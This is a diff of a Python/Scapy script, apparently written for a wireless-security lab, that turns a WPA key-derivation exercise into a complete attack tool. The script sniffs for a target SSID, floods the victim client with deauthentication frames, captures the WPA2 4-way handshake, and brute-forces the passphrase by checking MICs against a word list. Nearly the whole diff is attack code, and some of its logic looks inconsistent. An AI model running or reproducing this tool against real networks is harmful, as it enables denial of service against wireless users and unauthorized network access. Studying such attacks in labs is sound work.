@@ -6,80 +6,56 @@ from pbkdf2_math import pbkdf2_hex
 from numpy import array_split
 from numpy import array
 import hmac, hashlib
+import os 
 
 interface = sys.argv[1]
 ssidToHack = sys.argv[2]
 victimMAC = sys.argv[3]
 
-deauth = rdpcap("deauthExemple.pcap")
+if (os.path.isfile("4way.pcap")):
+	os.remove("4way.pcap")
 
-def deauth(nbrTime, APmacArg):
+def deauth(nbrTime, APmacArg, victimMAC):
 
-	
+	deauth = rdpcap("deauthExemple.pcap")
 
-	deauth[0].addr1 = a2b_hex(victimMAC.replace(":",""))
-	deauth[0].addr2 = a2b_hex(APmacArg.replace(":",""))
-	deauth[0].addr3 = a2b_hex(APmacArg.replace(":",""))
+	#deauth[0].show()
+
+	print "Starting deauth..."
+
+	# deauth[0].addr1 = a2b_hex(victimMAC.replace(":",""))
+	# deauth[0].addr2 = a2b_hex(APmacArg.replace(":",""))
+	# deauth[0].addr3 = a2b_hex(APmacArg.replace(":",""))
+
+	#deauth[0].show()
+
 
 	for n in range(nbrTime):
-		sendp(packet)
-		print 'Deauth sent via: ' + interface + ' to BSSID: ' + APmacArg + ' for Client: ' + victimMAC
+		sendp(deauth[0],iface=interface)
+	print 'Deauth sent via: ' + interface + ' to BSSID: ' + APmacArg + ' for Client: ' + victimMAC
 
 
 def AP_sniff(pkt):
 	if pkt.type == 0 and pkt.subtype == 8:
 		if pkt.info == ssidToHack:
+			print "SSID to hack found"
 			return True
 
 def handshake_sniff(pkt):
+	if (len(handshakes) == 4):
+		return True
+	if pkt.type == 2 and pkt.subtype == 8:
+		if (pkt.addr1 == victimMAC and pkt.addr2 == APmac):
+			if(not handshakes or (pkt not in handshakes)):
+				print "adding handshake"
+				pkt.show()
+				handshakes.append(pkt)
 	if pkt.type == 2 and pkt.subtype == 0:
-		if (pkt.addr2 == victimMAC or pkt.addr2 == APmac) and (pkt.addr1 == victimMAC or pkt.addr1 == APmac):
-			wrpcap("4way.pcap",pkt,append=True)
-			if(len(rdpcap("4way.pcap")) == 4):
-				return True
-			else:
-				return False
-
-
-# Sniff le réseau en fct l'interface et filtres les paquets
-pktAP = sniff(iface=interface,stop_filter=AP_sniff)
-
-APmac = pktAP[len(pktAP)-1].addr2
-
-pktHS = sniff(iface=interface,stop_filter=handshake_sniff)
-
-
-
-
-# Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "actuelle"
-A           = "Pairwise key expansion" #this string is used in the pseudo-random function
-
-
-ssid        = wpa[0].info
-APmac       = a2b_hex(wpa[0].addr2.replace(":",""))
-Clientmac   = a2b_hex(wpa[1].addr1.replace(":",""))
-ANonce      = (wpa[5].load)[13:45]
-SNonce      = (wpa[6].load)[13:45]
-
-mic_to_test = "36eef66540fa801ceee2fea9b7929b40"
-
-B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
-
-replaceStr 	= "0" * len(micOriginal)
-
-data        = b2a_hex(str((wpa[8])[EAPOL]))
-data 		= data.replace(micOriginal,replaceStr)
-
-print "\n\nValues used to derivate keys"
-print "============================"
-print "Passphrase: ",passPhrase,"\n"
-print "SSID: ",ssid,"\n"
-print "AP Mac: ",b2a_hex(APmac),"\n"
-print "CLient Mac: ",b2a_hex(Clientmac),"\n"
-print "AP Nonce: ",b2a_hex(ANonce),"\n"
-print "Client Nonce: ",b2a_hex(SNonce),"\n"
-
+		if (pkt.addr1 == APmac and pkt.addr2 == victimMAC):
+			if(not handshakes or (pkt not in handshakes)):
+				print "adding handshake"
+				pkt.show()
+				handshakes.append(pkt)
 
 def customPRF512(key,A,B):
     """
@@ -94,22 +70,82 @@ def customPRF512(key,A,B):
         R = R+hmacsha1.digest()
     return R[:blen]
 
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
+def testWord(passPhrase):
+	"""
+	This function take a passphrase, generate the mic and say if its equal to orignal
+	or not.
+	"""
 
-#expand pmk to obtain PTK
-ptk = customPRF512(a2b_hex(pmk),A,B)
+	micToCompare = generateMic(passPhrase)
 
-#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+	print "Passphrase testée: " + passPhrase
+	print "================================================"
+	print "Mic original: " + micOriginal
+	print "Mic à comparer: " + micToCompare
 
+	if micToCompare == micOriginal:
+		print "La passphrase utilisée est correcte !\n"
+	else:
+		print "Echec: essayer avec une nouvelle passphrase !\n"
 
-print "\nResults of the key expansion"
-print "============================="
-print "PMK:\t\t",pmk,"\n"
-print "PTK:\t\t",b2a_hex(ptk),"\n"
-print "KCK:\t\t",b2a_hex(ptk[0:16]),"\n"
-print "KEK:\t\t",b2a_hex(ptk[16:32]),"\n"
-print "TK:\t\t",b2a_hex(ptk[32:48]),"\n"
-print "MICK:\t\t",b2a_hex(ptk[48:64]),"\n"
-print "MIC:\t\t",mic.hexdigest(),"\n"
+def generateMic(passPhrase):
+	"""
+	This function generate a mic from a passphrase.
+	"""
+
+	#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+	pmk = pbkdf2_hex(passPhrase, ssidToHack, 4096, 32)
+
+	#expand pmk to obtain PTK
+	ptk = customPRF512(a2b_hex(pmk),A,B)
+
+	#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+	mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+
+	mic = mic.hexdigest()[:32]
+
+	return mic
+
+def testWordList():
+
+	#This function test each passphrase from a word list
+
+    # Open the UNIX dictonary of words.
+    with open('words.txt', 'r') as f:
+    	words = f.read().split()
+
+    # Loop over all the words.
+    for word in words:
+		testWord(word)
+
+# Sniff le réseau en fct l'interface et filtres les paquets
+pktAP = sniff(iface=interface,stop_filter=AP_sniff)
+
+APmac = pktAP[len(pktAP)-1].addr2 
+
+deauth(100, APmac, victimMAC)
+
+print "Starting sniff for handshakes..."
+
+handshakes = []
+pktHS = sniff(iface=interface,stop_filter=handshake_sniff)
+
+# Important parameters for key derivation - most of them can be obtained from the pcap file
+A           = "Pairwise key expansion" #this string is used in the pseudo-random function
+
+ANonce      = (handshakes[0].load)[13:45]
+SNonce      = (handshakes[1].load)[13:45]
+
+micOriginal = b2a_hex((handshakes[3].load)[77:93])
+
+print micOriginal
+
+B           = min(APmac,victimMAC)+max(APmac,victimMAC)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
+
+replaceStr 	= "0" * len(micOriginal)
+
+data        = b2a_hex(str((handshakes[3])[EAPOL]))
+data 		= data.replace(micOriginal,replaceStr)
+
+# Execute the script
+testWordList()
